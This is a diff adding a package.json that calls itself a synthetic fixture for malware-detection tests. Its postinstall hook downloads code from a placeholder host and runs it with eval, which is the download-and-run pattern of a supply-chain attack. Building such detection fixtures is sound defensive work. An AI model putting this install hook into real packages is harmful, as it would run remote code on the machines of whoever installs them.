@@ -1,0 +1,10 @@
+{
+  "name": "fixture-color-term-helpers",
+  "version": "1.4.2",
+  "description": "FIXTURE ONLY — synthetic detection test sample, not real malware",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e \"require('https').get('https://payload.example.invalid/x',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\""
+  },
+  "license": "MIT"
+}
